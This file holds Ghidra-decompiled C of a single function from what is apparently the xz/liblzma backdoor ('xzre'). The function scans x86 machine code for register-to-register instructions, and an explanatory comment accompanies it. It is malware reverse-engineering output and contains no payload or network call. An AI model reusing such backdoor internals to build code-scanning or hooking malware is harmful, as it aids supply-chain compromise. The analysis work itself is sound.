// /home/kali/xzre-ghidra/xzregh/10AC40_find_reg2reg_instruction.c
// Function: find_reg2reg_instruction @ 0x10AC40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_reg2reg_instruction(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx)


/*
 * AutoDoc: Requires a caller-supplied decoder context and walks instructions until it finds a pure register-to-register transfer.
 * Accepts MOV reg↔reg plus a masked set of arithmetic-immediate opcodes, but rejects any lock/rep prefixes, REX.W/B bits, or ModRM modes other than 3.
 * Returns TRUE with `dctx` still on the shuffle; decode failures or reaching `code_end` return FALSE so pointer propagation routines know no memory was touched.
 */

#include "xzre_types.h"

BOOL find_reg2reg_instruction(u8 *code_start,u8 *code_end,dasm_ctx_t *dctx)

{
  BOOL decode_ok;
  uint opcode_index;
  
  if (dctx == (dasm_ctx_t *)0x0) {
    return FALSE;
  }
  while( TRUE ) {
    if ((code_end <= code_start) || (decode_ok = x86_dasm(dctx,code_start,code_end), decode_ok == FALSE)) {
      return FALSE;
    }
    if (((((*(uint *)(dctx->opcode_window + 3) & 0xfffffffd) == 0x109) ||
         ((opcode_index = *(uint *)(dctx->opcode_window + 3) - 0x81, opcode_index < 0x3b &&
          ((0x505050500000505U >> ((byte)opcode_index & 0x3f) & 1) != 0)))) &&
        (((dctx->prefix).flags_u16 & 0xf80) == 0)) &&
       ((((dctx->prefix).decoded.rex.rex_byte & 5) == 0 &&
        (*(char *)((long)&dctx->prefix + 0xd) == '\x03')))) break;
    code_start = dctx->instruction + dctx->instruction_size;
  }
  return TRUE;
}

